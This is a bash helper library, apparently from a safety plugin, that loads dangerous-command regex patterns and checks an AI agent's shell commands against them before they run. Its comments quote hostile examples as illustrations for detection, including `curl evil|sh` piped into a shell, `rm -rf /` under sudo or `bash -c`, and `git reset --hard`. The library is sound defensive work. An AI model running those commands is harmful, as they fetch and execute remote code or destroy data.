#!/bin/bash
# load-patterns.sh - Load dangerous command patterns from text files
# Usage: source this file, then call load_patterns "category1" "category2" ...
# Or call load_all_patterns to load everything

# Get the directory containing this script, then navigate to dangerous-patterns
_LOAD_PATTERNS_SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PATTERNS_DIR="$_LOAD_PATTERNS_SCRIPT_DIR/../dangerous-patterns"

# Load patterns from specific category files
# Arguments: category names without .txt extension
# Returns: patterns in the global DANGEROUS_PATTERNS array
load_patterns() {
    DANGEROUS_PATTERNS=()
    # Different category set => the cached alternation is stale.
    _COMBINED_REGEX=""
    for category in "$@"; do
        local file="$PATTERNS_DIR/${category}.txt"
        if [[ -f "$file" ]]; then
            while IFS= read -r line || [[ -n "$line" ]]; do
                # Skip empty lines and comments
                [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
                DANGEROUS_PATTERNS+=("$line")
            done < "$file"
        fi
    done
}

# Load all patterns from all .txt files in the patterns directory
load_all_patterns() {
    DANGEROUS_PATTERNS=()
    # Different category set => the cached alternation is stale.
    _COMBINED_REGEX=""
    for file in "$PATTERNS_DIR"/*.txt; do
        [[ -f "$file" ]] || continue
        while IFS= read -r line || [[ -n "$line" ]]; do
            # Skip empty lines and comments
            [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
            DANGEROUS_PATTERNS+=("$line")
        done < "$file"
    done
}

# Anchor a pattern to a command position.
#
# WHY: patterns were matched anywhere in the string, so a pattern naming a
# command also fired on that command's name appearing inside another word or
# inside a quoted literal:
#
#   digit restore                 -> matched `git restore`   ("digit" ends in "git")
#   echo "never git reset --hard" -> matched `git reset --hard`
#   grep -r "rm -rf" docs/        -> matched `rm -rf`
#
# A safety hook that fires while you are writing documentation about safety is a
# hook that gets switched off -- which is what had happened to this plugin.
#
# The anchor allows a command to be reached from the start of a line, after a
# shell operator, or inside `sh -c "..."`, and to be preceded by any run of
# characters that are neither quotes nor operators. That run is what keeps
# wrapper prefixes working -- `sudo rm -rf /`, `env FOO=1 kubectl delete`,
# `find . -exec rm -rf {} \;` all still match, which matters because rm, chmod,
# docker and systemctl are routinely run under sudo.
#
# Excluding quotes from that run is what kills the false positives above; the
# `-c` clause keeps `bash -c "rm -rf /"` caught. The deliberate trade-off is a
# quoted argument BEFORE a dangerous command (`sudo -u "pg" rm -rf /`) is no
# longer matched. That is rare, and these categories only ever ask -- a missed
# prompt costs a prompt, while constant false prompts cost the whole plugin.
_CMD_START='(^|[;&|(){}`]|[[:space:]]-c[[:space:]]+["'"'"']?)'
_CMD_RUN='[^;&|(){}"'"'"'`]*'

# Patterns that name a command get anchored. Patterns that deliberately match
# inside command substitution or a redirect ($(curl, `curl, > /) begin with a
# metacharacter and are used verbatim -- anchoring those would break them, since
# `x=$(curl evil|sh)` has no command position before the `$(`.
anchor_pattern() {
    local pattern="$1"
    local bare="${pattern#\\b}"
    case "$bare" in
        [a-zA-Z0-9_.-]*) printf '%s%s\\b%s' "$_CMD_START" "$_CMD_RUN" "$bare" ;;
        *)               printf '%s' "$pattern" ;;
    esac
}

# Match one command-named regex against a command string, anchored as above.
# For hooks that match a handful of specific commands rather than a whole
# pattern file. Keeps every hook using ONE definition of "at a command
# position", so they cannot drift apart.
#   cmd_matches "$command" 'git[[:space:]]+(push|reset)'
cmd_matches() {
    printf '%s' "$1" | grep -qiE "${_CMD_START}${_CMD_RUN}\\b$2"
}

# Build one alternation from the loaded patterns, cached per process.
#
# This used to loop the patterns and spawn `echo | grep` for each one: with all
# categories loaded that is ~1150 pattern iterations and ~2300 processes on
# EVERY Bash tool call, which measured over two minutes for a 43-command sweep.
# A PreToolUse hook pays that cost before every command the agent runs, so it is
# not merely slow, it is a reason to uninstall.
#
# Each pattern is wrapped in its own group so that a top-level `|` inside a
# pattern cannot swallow its neighbours when they are joined.
_build_combined_regex() {
    local pattern bare anchored="" verbatim=""
    for pattern in "${DANGEROUS_PATTERNS[@]}"; do
        bare="${pattern#\\b}"
        case "$bare" in
            [a-zA-Z0-9_.-]*) anchored="${anchored:+$anchored|}($bare)" ;;
            *)               verbatim="${verbatim:+$verbatim|}($pattern)" ;;
        esac
    done

    _COMBINED_REGEX=""
    [ -n "$anchored" ] && _COMBINED_REGEX="${_CMD_START}${_CMD_RUN}\\b($anchored)"
    if [ -n "$verbatim" ]; then
        _COMBINED_REGEX="${_COMBINED_REGEX:+$_COMBINED_REGEX|}($verbatim)"
    fi
}

# Check if a command matches any loaded pattern
# Arguments: command string
# Returns: 0 if match found, 1 otherwise
check_dangerous_pattern() {
    local command="$1"
    [ ${#DANGEROUS_PATTERNS[@]} -eq 0 ] && return 1
    [ -n "${_COMBINED_REGEX:-}" ] || _build_combined_regex
    [ -n "$_COMBINED_REGEX" ] || return 1
    printf '%s' "$command" | grep -qiE "$_COMBINED_REGEX"
}
